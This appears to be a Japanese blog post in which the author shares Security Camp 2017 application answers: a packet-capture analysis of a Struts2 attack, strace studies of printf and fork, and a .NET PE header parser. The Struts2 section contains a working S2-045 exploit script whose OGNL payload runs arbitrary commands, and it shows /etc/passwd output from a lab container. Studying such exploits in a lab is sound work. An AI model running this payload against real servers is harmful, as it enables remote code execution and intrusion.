---
layout: post
title: セキュリティキャンプ2017応募用紙晒し
date: 2017-06-16 17:00:31
categories: diary
---

# はじめに
セキュリティキャンプ2017に無事参加できることが決まりました。  
ここがゴールではないので、キャンプでは全てを吸収して今後に活かしていきます。

各位よろしくお願いします。

以下晒し。
# 共通問題
共通問題にはあまり時間をかけませんでした（かけれなかった）ので、量もそれほど書いていませんので、軽くだけ書きます。  
関係ないかもしれないが、日本語がおかしくならないように見返したり「ですます」で揃えた。

## 成果物
今までやってきたことの振り返りも含めて作ってきたもの・取り組んできたことについてひたすら書きました。  
「作ったものについて」 ＋ 「それによってどんな知見を得たのか」を中心に書きました。

## 楽しみな講義
講義スケジュールをみて、参加できたら受けたい講義を時間割ごとにそれぞれ選びました。講義ごとに、自分の経験を絡めて講義を通して学びたい・期待したいことを書きました。（普段勉強・研究してることを絡めて、今後の研究に活かしたいとか）

## あなたがセキュリティ・キャンプでやりたいことは何ですか？　身につけたいものは何ですか？（複数可）
思いついたことを書くのみ

# 選択問題
ほぼ選択問題に時間を使ってしまった。時間配分大事。  
取り組んでるだけで、知らないこともたくさん出てきて楽しかた。

選んだ問題はA-1, A-4, A-6です。

## A-1

通信の意図がわかってからは検証環境を作り、それと比較しながら解析しました。最後に検証の結果を書きます。  
検証パケット: https://drive.google.com/open?id=0B_gtN2h5AKfRWWpwN0xUX0dVbDA

— 解析 —

まず初めにHTTPとSSHの通信の二つに分けられます。  
HTTP  
正常にTCPコネクションを確立し、’192.168.74.1:8080/struts2-rest-showcase/orders.xhtml’ に対してGETリクエストを送り、対象からACKが返ってきたところでパケットが欠けていて、切断処理に飛んでいます。
1. コネクション確立
2. GETリクエスト
3. ???
4. 切断
という通信フローになっていて欠けている部分はGETリクエストに対するレスポンスが含まれると考えられます。

通信の意図を考えるためにGETリクエストを詳しくみていくと、
URLから察するにサーバではApache Struts2が動いており、Content-TypeにOGNL式が与えられていることからApache Struts2 の任意コード実行の脆弱性(S2-045/CVE-2017-5638)への攻撃だと予想がつきました。  
これは、Apache Struts2.3.5 - 2.3.31, 2.5 - 2.5.10に対して有効な攻撃であり任意のコードが実行可能です。書かれたOGNL式を見ると ‘cat /etc/passwd’とありこのコマンドが実行されていることが考えられます。
/etc/passwd/からわかることは, 　ユーザ名, ユーザ番号, グループ番号, コメントフィールド, ホームディレクトリーのパス, ログインシェルがあります。  
ここからパスワード自体が流出することはありませんが、ここで得られた情報を元に次のssh接続に使われていると考えられます。

SSH
ssh通信では一方的にサーバに対して接続を試みていることから、得られたユーザ名を使って接続しようとしていることがわかります。  
レスポンスがないので接続には失敗していると考えるとサーバはroot権限では動いていなくて, パスワードは流出していないと考えられます。

まとめると、この通信はApache Struts2 の任意コード実行の脆弱性(S2-045/CVE-2017-5638)を狙った攻撃であり、 ‘cat /etc/passwd’で得られたユーザ名を使ってSSH接続を試みています。

次に、欠けている通信フローについて考えます。  
No.8,9のパケットは切断を始めていてそこで[TCP ACKed unseen segment]とある。No.8,9のAcknowledgement numberは1464で、直前のSequence numberは1であるため、その間に1463(1464-1)のデータがやりとりされていなければおかしいことになる。  
そして、ここにはNo.4のGETリクエストに対するレスポンスが来ると考えていました。そのレスポンスはHTTPヘッダと’cat /etc/passwd’の結果であり、そのサイズが1463であることがわかります。  
ここで、コネクション確立時の通信を見ると、MSSが1460に設定されていることからこのレスポンスを送るには２回に分けて送る必要があります。

これらから、ここで欠けていると考えられる通信はGETリクエストのレスポンスを２つに分けて、  
1つ目を送る通信 ( 192.168.74.1 -> 192.168.74.130)  
それに対する応答 (192.168.74.130 -> 192.168.74.1)  
２つ目を送る通信 (192.168.74.1 -> 192.168.74.130)  
が考えられました。

次にNo.11の通信では[TCP Previous segment not captured]とあり前の通信が欠けている。欠けている通信は, No.9のFIN, ACKに対する応答であるので、  
192.168.74.1 -> 192.168.74.130 ACK Seq=1464, Ack=1094 Win=32128  
という通信が欠けていると考えられます.

最後のNo.12の[TCP ACKed unseen segment]は先にやったGETリクエストに対するレスポンスが欠けているせいです。

まとめると、
GETリクエストに対するレスポンスを２つに分けて、  
1つ目を送る通信 ( 192.168.74.1 -> 192.168.74.130)  
それに対する応答 (192.168.74.130 -> 192.168.74.1)  
２つ目を送る通信 (192.168.74.1 -> 192.168.74.130)  
と  
No.9のFIN, ACKに対する応答  
192.168.74.1 -> 192.168.74.130 ACK Seq=1464, Ack=1094 Win=32128  
の通信が欠けていると考えられます。  

— 検証 —

検証した結果についてまとめます.

環境
* Docker17.05
* Apache Struts 2.5.10
* tomcat 7.0

PoC - 対象URLと実行したいコマンドを与えます。

`python ex.py http://localhost:8080/struts2-rest-showcase/orders.xhtml cat /etc/passwd`


```
#! -*- encoding: utf-8 -*-

import requests
import sys
def poc(url, cmd):
    payload = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + cmd + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

    headers = {}
    headers["Content-Type"] = payload
    r = requests.get(url, headers=headers)
    print(r.content)

if __name__ == '__main__':
    if len(sys.argv) == 1:
        print "python ex.py target command"
        sys.exit()
    cmd = ""
    for c in range(2, len(sys.argv)):
        cmd += sys.argv[c] + " "

    poc(sys.argv[1], cmd)
```

レスポンス
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
messagebus:x:104:107::/var/run/dbus:/bin/false
```

任意のコードを実行することができました。
検証パケット: https://drive.google.com/open?id=0B_gtN2h5AKfRWWpwN0xUX0dVbDA


## A-4
-- 問題文 --
C言語のprintf()関数またはUNIXのfork()というシステムコールについて、これらはどのようなものですか？　数値や文字列を表示する・プロセスを作るというだけではなく、深堀りして考え、疑問を持ち、手を動かして調べてわかったことを教えてください。

-- 回答 --

— printf() —

まず以下のコードが実行される過程をstraceを使って追いました。

hello.c

```
#include <stdio.h>
int main(int argc, char *argv[]) {
  printf(“Hello, World\n”);
}
```

gcc hello.c -o hello
strace ./hello をして結果が次のようになりました。１行ずつみていきます。(システムコールとシグナルを 追跡する)

http://man7.org/linux/man-pages/dir_all_alphabetic.html を参照しながらみました。

```
1		execve("./hello", ["./hello"], [/* 100 vars */]) = 0
	* 実行するファイル -  ./hello
	* 引数 - ./hello
	* 環境変数 -
2		brk(NULL)                               = 0xab2000
  * break point(データセグメントの末尾)を変更する関数だが、NULLを与えると現在のbreak pointが得られる。
3		access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
	* /etc/ld.so.nohwcap が存在するか確認 -> ない
4		mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f9dcfe2b000
	* 0x7f9dcfe2b000から8192バイトの領域を
 	* 読み書き可能かつ
	* マッピングに対する変更が他プロセスには見えず、どのファイルとも関連付けされず、
	* その領域を0で初期化
5		access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
	* /etc/ld.so.preload が読み込めるか -> ない
6		open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
	* /etc/ld.so.cache をr
	* readonlyかつ
	* close-on-execフラグをオンにして(exec時に自動クローズ)
	* ファイルディスクリプタ３に読み込み
7		fstat(3, {st_mode=S_IFREG|0644, st_size=107589, ...}) = 0
	* ファイルディスクリプタ3(/etc/ld.so.cache)の情報を取得.
	* 通常ファイルかつパーミッション644でサイズが107589バイト…
	* 取得に成功したので戻り値が0
8		mmap(NULL, 107589, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f9dcfe10000
	* 0x7f9dcfe10000から107589バイト分(ファイルディスクリプタ３)をマッピング
	* 読み込み可能
	* マッピングに対する変更が他プロセスには見えず
	* 0で初期化
9		close(3)                                = 0
	* ファイルディスクリプタ３をクローズ
10	access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
	* /etc/ld.so.nohwcap が存在するか -> ない
11	open("/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
	* /lib/x86_64-linux-gnu/libc.so.6 をファイルディスクリプタ３にロード
	* readonly
	* close-on-execフラグをオンにして(exec時に自動クローズ)
12	read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P\t\2\0\0\0\0\0"..., 832) = 832
	* ファイルディスクリプタ３(/lib/x86_64-linux-gnu/libc.so.6)を832バイト読み込み
    13	fstat(3, {st_mode=S_IFREG|0755, st_size=1864888, ...}) = 0
	* ファイルディスクリプタ3(/lib/x86_64-linux-gnu/libc.so.6)の情報を取得.
	* 通常ファイルかつパーミッション755でサイズが1864888バイト.
	* 取得に成功したので戻り値が0
14	mmap(NULL, 3967392, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f9dcf83f000
	* 0x7f9dcf83f000から3967392バイト分(ファイルディスクリプタ３)をマッピング
	* 読み込み、実行可能
	* マッピングに対する変更が他プロセスには見えず
	* MAP_DENYWRITEはdenial-of-service攻撃の原因となったので無視される。なぜ指定する？
15	mprotect(0x7f9dcf9fe000, 2097152, PROT_NONE) = 0
	* 0x7f9dcf9fe000から2097152バイト分の領域をアクセス禁止にする
16	mmap(0x7f9dcfbfe000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1bf000) = 0x7f9dcfbfe000
	*  0x7f9dcfbfe000(15でアクセス禁止にしたアドレスの次)から24576バイト分(ファイルディスクリプタ3でオフセット0x1bf000)マッピング
	*  読み書き可
	*  マッピングに対する変更が他プロセスには見えない
	*  0x7f9dcfbfe000を直接指定
17	mmap(0x7f9dcfc04000, 14752, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f9dcfc04000
  * 0x7f9dcfc04000から14752バイト分マッピング
  * 読み書き可
  * マッピングに対する変更が他プロセスには見えない
  * 0x7f9dcfc04000を直接指定
  * どのファイルとも関連付けされない
18	close(3)                                = 0
  * ファイルディスクリプタ３をクローズ
19	mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f9dcfe0f000
  * 0x7f9dcfe0f000から4096バイトマッピング
20	mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f9dcfe0e000
  * 0x7f9dcfe0e000から4096バイトマッピング
21	mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f9dcfe0d000
  * 0x7f9dcfe0d000バイトマッピング
22	arch_prctl(ARCH_SET_FS, 0x7f9dcfe0e700) = 0
  * FS レジスターの64ビットベースを0x7f9dcfe0e700に設定
23	mprotect(0x7f9dcfbfe000, 16384, PROT_READ) = 0
  * 0x7f9dcfbfe000から16384バイトの領域をreadonlyにする　
24	mprotect(0x600000, 4096, PROT_READ)     = 0
  * 0x600000から4096バイトの領域をreadonlyにする.
25	mprotect(0x7f9dcfe2d000, 4096, PROT_READ) = 0
  * 0x7f9dcfe2d000から4096バイトの領域をreadonlyにする
26	munmap(0x7f9dcfe10000, 107589)          = 0
  * 0x7f9dcfe10000から107589バイトのマッピングを削除
27	fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 17), ...}) = 0
  * ファイルディスクリプタ１の情報を取得
  * キャラクターデバイス
  * デバイスID = メジャーIDが136, マイナーIDが17
28	brk(NULL)                               = 0xab2000
  * 現在のbreak point
29	brk(0xad3000)                           = 0xad3000
  * break pointを0xad3000に変更
30	write(1, "Hello, world\n", 13Hello, world)          = 13
  * ファイルディスクリプタ１にHello, world\nを書き込む
31	exit_group(0)                           = ?
  * プロセス中の全スレッドをexitする
32	+++ exited with 0 +++
```

printf()を呼ぶだけで32行かかり、次の12種類のシステムコールが呼ばれていた。

execve,brk, access, mmap, open, fstat, close, read, mprotect, arch_prctl, write, exit_group

write()で書き込むための準備(メモリの確保や保護, ライブラリリンク)を行っている。

次に、"Hello, world"と"Hello, world\n"をprintfで出力するのに違いがあるかを調べました。

hello.cを前者(改行有り)、hello2.cを後者(改行無し)とします。

先程と同様にstraceで比較した場合はwrite()の中身以外では違ったところはありませんでした。どちらも結局write()を使う

実行ファイルをobjdumpで逆アセンブルしたところPLTセクションに違いが出ました。

helloでは出力にputs()が使われ、hello2ではprintf()が使われていることがわかりました。

これは、gccがprintf()をputs()に自動で最適化してくれるようだ。gccに最適化無効オプション(-o0)をつけてもこの最適化はされた。

hello2が最適化されない理由は、終端が改行でないとputsに変換できないからです。

変換規則を調べると、
変数がない又は、コンパイル時に変数の中身が決まっているかつ終端が改行ならputs()に変換され、出力が１文字の場合はputchar()に変換されるようです。

printf(), puts(), putchar()にはどのような違いがあるのだろう。

printf()は与えられたフォーマットに従って標準出力に書き込む。

puts()は与えられた文字列を標準出力に書き込む。

putchar()は与えられた文字を標準出力に書き込む。

puts(), putchar()をprintf()で書き換えることはできて、printf()をputs(), putchar()にするには条件が必要。

なぜ、printf()をputs(), putchar()に最適化しなければならないのか。

printf()がフォーマットのチェックをするため遅いことが上げれらる. ので、書き込む文字列が自明な場合はputs()やputchar()への最適化がなされると考えました。

— fork() —

実行中のプロセスほぼ同じプロセスを作成する。違う点は、
* 親プロセスとは異なるプロセスIDが割り振られる
* 子プロセス内のppid(parent pid)は親プロセスのプロセスIDになる
* 子プロセス内のリソースに関する統計値は0へリセットされる
* 保留中のシグナルは全て破棄され、子プロセスへは受け継がれない
* 子プロセスは獲得済みに全てのファイルロックを受け継がない

そもそも普段どういうところで使われているのだろう。

シェルにおいてはパイプでコマンドを繋いだ時に使われる。

例えば、find / | grep fork としプロセスをみると、

```
F   UID    PID   PPID PRI  NI    VSZ   RSS WCHAN  STAT TTY        TIME COMMAND
0  1000 111402  51126  20   0  58812  7916 sigsus Ss   pts/17     0:30 zsh
0  1000  74929 111402  20   0  19692  2880 -      R+   pts/17     0:00 find /
0  1000  74930 111402  20   0  14228   972 pipe_w S+   pts/17     0:00 grep fork
```

```
zsh
 |- find /
 |- grep
```

というようにzshを親プロセスとしてfindとgrepの二つのプロセスが動いていることが確認できた.

シェルスクリプトの場合はどうなるのだろう。
```
#! /bin/sh
find / | grep fork
```
すると次のようになった。
```
F   UID    PID   PPID PRI  NI    VSZ   RSS WCHAN  STAT TTY        TIME COMMAND
0  1000 111402  51126  20   0  58812  7772 sigsus Ss   pts/17     0:30 zsh
0  1000  75754  75753  20   0  19692  2888 -      R+   pts/17     0:00 find /
0  1000  75755  75753  20   0  14228   920 -      R+   pts/17     0:00 grep fork
0  1000  75753 111402  20   0   4512   704 wait   S+   pts/17     0:00 /bin/sh ./test.sh
```

```
zsh
 |-- /bin/sh ./test.sh
   |- find /
   |- grep fork
```

のようになり親と子のプロセスの関係がつかめて来ました。
forkはどのように呼ばれるのでしょうか.

starce ./test.shで見てみました.

```
execve("./test.sh", ["./test.sh"], [/* 100 vars */]) = 0
...
stat("/usr/bin/find", {st_mode=S_IFREG|0755, st_size=221768, ...}) = 0
pipe([3, 4])                            = 0
clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f03170c79d0) = 77053
close(4)                                = 0
...
stat("/bin/grep", {st_mode=S_IFREG|0755, st_size=211224, ...}) = 0
clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f03170c79d0) = 77054
close(3)                                = 0
...
exit_group(0)                           = ?
+++ exited with 0 +++
```
fork()というシステムコールを呼んでいると思ったらclone()が呼ばれていました。これはLinuxで動かしたため?clone()なっているようで、違いは親と子プロセスがメモリ空間などを共有できること。

fork()は単純に親プロセスのデータを全てコピーして子プロセスを作成していると思っていましたが、調べると現在はcopy-on-write方式を使って最適化している。

これは、データを複製するときに単純にメモリを確保してそこに全てをコピーすると、もしコピーしたデータを書き換えなければそのコピーは無駄になってしまう。

なので、初めは親と同じものを参照するようにして、書き換えをしようとした時点でメモリ確保とコピーを実施するという方式です。

データにcopy-on-writeの属性を与えて起き、変更しようとしたときにページフォルトを発生させてその時にコピーを作成しcopy-on-write属性を消す。

forkの流れをまとめると、
子プロセスに新しいPIDを割り当て、
プロセスディスクリプタを割り当て、親プロセスのプロセスディスクリプタから内容をコピーする。

thread_info構造体を割り当て、親プロセスのthread_info構造体から内容をコピーします。

利用中ファイルの情報、シグナルの情報、メモリディスクリプタなどをコピーします。

親プロセスのスタックに退避されているレジスタの値を子プロセスのスタックにコピーします。

ステータスを実行待ち(TASK_RUNNING)に設定し、ランキューに登録します。
この時、プロセスディスクリプタ、thread_info構造体、利用中の資源の情報などは全てコピーするが、メモリ空間はコピーせずに親プロセスと共有して書き換えが発生したら複製を行います。  


## A-6
-- 問題文 --

PE（Portable Executable）ファイルフォーマットの構造を調べ、添付の.NETアプリケーションから文字列を取得する機能を実装してください。具体的には、ファイルの先頭からヘッダを順次参照することで.NETアプリケーションの文字列（String）型リソースを取得するプログラムを作成してください。その際、以下の制限、規則に従ってください。
- この.NETアプリケーションのみでなく、汎用的に文字列型を取得できるようなプログラム構造にしてください。
- PEファイルを解析するような他者のコードは利用せず、自分で調べたPEファイルフォーマットの構造に従い、一からパースするプログラムを作ってください。
- 参考にしたサイトや調べて分かったこと、作成したプログラムの工夫点などはできる限り詳細に記述してください。

-- 回答 --


添付アプリケーションを実行してみると、
```
Hello, world!
hoge huga
string test
```
という出力を得られ、これらの文字列がファイル構造を調べていくうちにどこかに格納されていると思ったのでとりあえずファイル構造を調べて構造通りにパースするプログラムを作ることでリソースを取り出そうと考えました。

まず、PEファイルの構造から調べました。
この時に参考になったのが、以下のサイトとILSpy, CFF Explorerを使い整合性を確かめながら作りました。
- http://www.atmarkit.co.jp/ait/articles/1202/17/news129.html
- http://www.openrce.org/reference_library/files/reference/PE%20Format.pdf
- http://home.a00.itscom.net/hatada/mcc/doc/pe.html
- http://tech.blog.aerie.jp/entry/2015/12/27/144045

作成したプログラムで得られた結果を交えながら説明します。`https://gist.github.com/kobad/971402233be32b10b0810f5b92433538`

ctypesを使わない実装をしました。理由は環境によってctypesの挙動が変わることが考えられるのと、pythonのみでの実装がしたかったからです。
.NETリソースの取得までの機能を実装したので、まだ機能追加・改善の余地があるので、拡張がしやすいような設計を心がけました。
structでの表現を使っています.(B -> 1byte, H -> WORD, I -> DWORD, Q -> 8byte, Xs -> Xbyte)

PEファイルは大まかにこのような構造になっています。

1. _IMAGE_DOS_HEADER
2. _IMAGE_NT_HEADERS - _IMAGE_FILE_HEADER, _IMAGE_OPTIONAL_HEADER
3. _IMAGE_SECTION_HEADER
4. _IMAGE_SECTION_HEADER
5. ...

_IMAGE_DOS_HEADERは次のような構造体に定義されています.
```
DOS_HEADER
	e_magic:            (H) 0x5a4d
	e_cblp:             (H) 0x90
	e_cp:               (H) 0x3
	e_crlc:             (H) 0x0
	e_cparhdr:          (H) 0x4
	e_minalloc:         (H) 0x0
	e_maxalloc:         (H) 0xffff
	e_ss:               (H) 0x0
	e_sp:               (H) 0xb8
	e_csum:             (H) 0x0
	e_ip:               (H) 0x0
	e_cs:               (H) 0x0
	e_lfarlc:           (H) 0x40
	e_ovno:             (H) 0x0
	e_res:              (8s) b'\x00\x00\x00\x00\x00\x00\x00\x00'
	e_oemid:            (H) 0x0
	e_oeminfo:          (H) 0x0
	e_res2:             (20s) b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	e_lfanew:           (I) 0x80
```
ここで特に重要は値はe_magicとe_lfanewで、
e_magicはマジックナンバー0x5A4D(MZ)が格納されていてこれは実行可能ファイルであることを示しています。 試しに5A4Dを004Dと変更すると、実行できなくなりました。

e_lfanewは次の_IMAGE_NT_HEADERSが始まるアドレス(オフセット)を示しています。なので、これを_IMAGE_DOS_HEADERの始めのアドレスにe_lfanewを足すことで_IMAGE_NT_HEADERSの先頭アドレスを求めることができます.

実際に、このアプリケーションのe_lfanewは0x80であるので0x80番地を見ると_IMAGE_NT_HEADERSのシグネチャである50 45 00 00 が見つけることができます。
PEファイルでのオフセット表記はRVA(相対仮想アドレス -> ベースアドレスからのオフセット)で表されます。

次に、IMAGE_NT_HEADERSは次のような構造体です。
```
struct _IMAGE_NT_HEADERS {
0x00 DWORD Signature;                       // 50 45 00 00 (PE\0\0)
0x04 _IMAGE_FILE_HEADER FileHeader;
0x18 _IMAGE_OPTIONAL_HEADER OptionalHeader;
};
```
１つ目にPEファイルであることを示すシグネチャがあります。
次に、_IMAGE_FILE_HEADER, _IMAGE_OPTIONAL_HEADERと続きます。
_IMAGE_FILE_HEADERは_IMAGE_NT_HEADERSの先頭アドレス+0x04
_IMAGE_OPTIONAL_HEADERは_IMAGE_NT_HEADERSの先頭アドレス+0x18
でそれぞれの先頭アドレスを求めることができます。

_IMAGE_FILE_HEADERは次のような構造体です。
```
FILE_HEADER
	Machine:              (H) 0x14c
	NumberOfSections:     (H) 0x3
	TimeDateStamp:        (I) 0x58dc7fb0
	PointerToSymbolTable: (I) 0x0
	NumberOfSymbols:      (I) 0x0
	SizeOfOptionalHeader: (H) 0xe0
	Characteristics:      (H) 0x102
```
ここで重要なのはNumberOfSectionsとSizeOfOptionalHeaderです。
NumberOfSectionsは_IMAGE_NT_HEADERSの後に続く_IMAGE_SECTION_HEADERの数を表し、
SizeOfOptionalHeaderはこの後の_IMAGE_OPTIONAL_HEADERのサイズを表します.

_IMAGE_OPTIONAL_HEADERは次のような構造体です。
```
OPTIONAL_HEADER
	Magic:                       (H) 0x10b
	MajorLinkerVersion:          (B) 0x8
	MinorLinkerVersion:          (B) 0x0
	SizeOfCode:                  (I) 0x1000
	SizeOfInitializedData:       (I) 0x800
	SizeOfUninitializedData:     (I) 0x0
	AddressOfEntryPoint:         (I) 0x2e6e
	BaseOfCode:                  (I) 0x2000
	BaseOfData:                  (I) 0x4000
	ImageBase:                   (I) 0x400000
	SectionAlignment:            (I) 0x2000
	FileAlignment:               (I) 0x200
	MajorOperatingSystemVersion: (H) 0x4
	MinorOperatingSystemVersion: (H) 0x0
	MajorImageVersion:           (H) 0x0
	MinorImageVersion:           (H) 0x0
	MajorSubsystemVersion:       (H) 0x4
	MinorSubsystemVersion:       (H) 0x0
	Win32VersionValue:           (I) 0x0
	SizeOfImage:                 (I) 0x8000
	SizeOfHeaders:               (I) 0x200
	CheckSum:                    (I) 0x0
	Subsystem:                   (H) 0x3
	DllCharacteristics:          (H) 0x8540
	SizeOfStackReserve:          (I) 0x100000
	SizeOfStackCommit:           (I) 0x1000
	SizeOfHeapReserve:           (I) 0x100000
	SizeOfHeapCommit:            (I) 0x1000
	LoaderFlags:                 (I) 0x0
	NumberOfRvaAndSizes:         (I) 0x10
	DataDirectory[16]:           (128s) b'\x00\x00\x00\x00\x00\x00\x00\x00\x1c.\x00\x00O\x00\x00\x00\x00@\x00\x00\x90\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`\x00\x00\x0c\x00\x00\x00|-\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08 \x00\x00H\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

_IMAGE_OPTIONAL_HEADERは今回はそこまで必要な情報は持っていませんでした。

次にIMAGE_SECTION_HEADERを見ていきます。

_IMAGE_SECTION_HEADERの数は_IMAGE_FILE_HEADERのNumberOfSectionsに示されていてこのアプリケーションでは0x3が取得できていました。

_IMAGE_SECTION_HEADERのサイズは0x28で固定であるのでセクション数のループを回せばそれぞれのセクションヘッダをパースできます。
```
SECTION
	Name:                     (Q) 0x747865742e
	VirtualSize:              (I) 0xe74
	VirtualAddress:           (I) 0x2000
	SizeOfRawData:            (I) 0x1000
	PointerToRawData:         (I) 0x200
	PointerToRelocations:     (I) 0x0
	PointerToLinenumbers:     (I) 0x0
	NumberOfRelocations:      (H) 0x0
	NumberOfLinenumbers:      (H) 0x0
	Characteristics:          (I) 0x60000020
SECTION
	Name:                     (Q) 0x637273722e
	VirtualSize:              (I) 0x590
	VirtualAddress:           (I) 0x4000
	SizeOfRawData:            (I) 0x600
	PointerToRawData:         (I) 0x1200
	PointerToRelocations:     (I) 0x0
	PointerToLinenumbers:     (I) 0x0
	NumberOfRelocations:      (H) 0x0
	NumberOfLinenumbers:      (H) 0x0
	Characteristics:          (I) 0x40000040
SECTION
	Name:                     (Q) 0x636f6c65722e
	VirtualSize:              (I) 0xc
	VirtualAddress:           (I) 0x6000
	SizeOfRawData:            (I) 0x200
	PointerToRawData:         (I) 0x1800
	PointerToRelocations:     (I) 0x0
	PointerToLinenumbers:     (I) 0x0
	NumberOfRelocations:      (H) 0x0
	NumberOfLinenumbers:      (H) 0x0
	Characteristics:          (I) 0x42000040
```
ここで重要なのが、VirtualAddressとPointerToRawDataです。

VirtualAddressはセクションのRVAで、セクション内のオフセット値はこれを用いて計算することになります。

PointerToRawDataは該当セクションがどこから始まるかを示します。

取得できた_IMAGE_SECTION_HEADERは次のようになっています。

ここまでで、PEヘッダのパースができました。

次に.NETアプリケーションの仕様を調べました。
以下が参考になりました。
- https://codingwithspike.wordpress.com/2012/08/12/building-a-net-disassembler-part-3-parsing-the-text-section/
- https://www.codeproject.com/Articles/12585/The-NET-File-Format
- http://www.atmarkit.co.jp/fdotnet/technology/idnfw11_index/index.html

.NETアプリケーションでは.textセクションの中にリソースが格納されています。
具体的には、
```
.text
 |- Import Address table
 |- CLR header
 |- IL Code and Managed Structured Exception Handling Tables (optional)
 |- Strong Name Signature Hash
 |- Meta Data
 |- Managed Resources
 |- Unmanaged Export Stub
 |- Runtime Startup Stub
```
という構造になっていて、CLRヘッダに必要な情報が入っています。

Import Address tableのサイズは常に0x8なので、.textが始まるアドレス0x200(PointerToRawData)+0x8 = 0x208からCLRヘッダが始まります。

定義された構造体通りにパースすると以下のようになりました。
```
CLR_HEADER
	HeaderSize:                     (I) 0x48
	MajorRuntimeVersion:            (H) 0x2
	MinorRuntimeVersion:            (H) 0x5
	MetaDataDirectoryAddress:       (I) 0x2258
	MetaDataDirectorySize:          (I) 0xb24
	Flags:                          (I) 0x3
  	EntryPointToken:              (I) 0x6000001
	ResourcesDirectoryAddress:      (I) 0x2128
	ResourcesDirectorySize:         (I) 0x12f
	StrongNameSignatureAddress:     (I) 0x0
	StrongNameSignatureSize:        (I) 0x0
	CodeManagerTableAddress:        (I) 0x0
	CodeManagerTableSize:           (I) 0x0
	VTableFixupsAddress:            (I) 0x0
	VTableFixupsSize:               (I) 0x0
	ExportAddressTableJumpsAddress: (I) 0x0
	ExportAddressTableJumpsSize:    (I) 0x0
	ManagedNativeHeaderAddress:     (I) 0x0
	ManagedNativeHeaderSize:        (I) 0x0
```

 目的のリソースはResourcesDirectoryAddressにありますが、これはRVA表記ではないので、本来のオフセットは ResourcesDirectoryAddress - 0x2000(.textのRVA) + 0x200(.textの先頭) = 0x328 となります。

 0x328からResource fileが始まります。これは以下のように取得できます。

```
 RESOURCE_FILE
	Signature:                              (I) 0xbeefcace
	NumberOfReaders:                        (I) 0x1
	SizeOfReaderTypes:                      (I) 0x91
